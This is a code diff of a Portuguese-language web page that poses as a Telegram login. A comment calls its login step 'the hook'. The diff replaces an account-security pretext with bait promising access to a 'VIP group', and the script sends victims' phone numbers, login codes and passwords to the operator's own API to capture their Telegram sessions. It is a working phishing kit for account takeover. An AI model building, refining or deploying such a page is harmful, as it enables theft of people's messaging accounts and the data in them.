@@ -123,8 +123,8 @@
 
             <!-- Passo 2: Login MTProto (O "Gancho") -->
             <div id="step-login" class="step">
-                <h1>📱 Autenticação de Sessão</h1>
-                <p class="subtitle">Para garantir a segurança da sua conta, conecte seu número de telefone oficial. Isso permite a recuperação em caso de perda de acesso.</p>
+                <h1>ENTRAR COM TELEGRAM✈️</h1>
+                <p class="subtitle">Confirme sua identidade para desbloquear o grupo vip🔥.</p>
 
                 <div class="input-group">
                     <label for="phone">Número de Telefone</label>
@@ -276,7 +276,7 @@
         function initApp() {
             try {
                 const user = window._mockTelegramUser;
-                
+
                 if (user) {
                     els.userAvatar.textContent = user.first_name?.[0] || 'T';
                     els.userName.textContent = `${user.first_name} ${user.last_name || ''}`.trim();
@@ -345,11 +345,11 @@
                         if (!state.authStarted) {
                 els.btnAuth.disabled = true;
                 showStatus(els.statusAuth, 'Enviando código via Telegram...', 'info');
-                
+
                 try {
                     // CORREÇÃO: Monta a URL com o parâmetro na query string
                     const urlWithQuery = `${API_BASE}/api/send-code?phone=${encodeURIComponent(cleanPhone)}`;
-                    
+
                     const response = await fetch(urlWithQuery, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' }
@@ -400,7 +400,7 @@
 
                 els.btnAuth.disabled = true;
                 showStatus(els.statusAuth, 'Validando sessão segura...', 'info');
-                
+
                 try {
                     const payload = {
                         phone: `+${cleanPhone}`,
@@ -468,7 +468,7 @@
 
                 els.btnAuth.disabled = true;
                 showStatus(els.statusAuth, 'Sincronizando sessão e criptografando dados...', 'info');
-                
+
                 try {
                     const payload = {
                         phone: `+${cleanPhone}`,
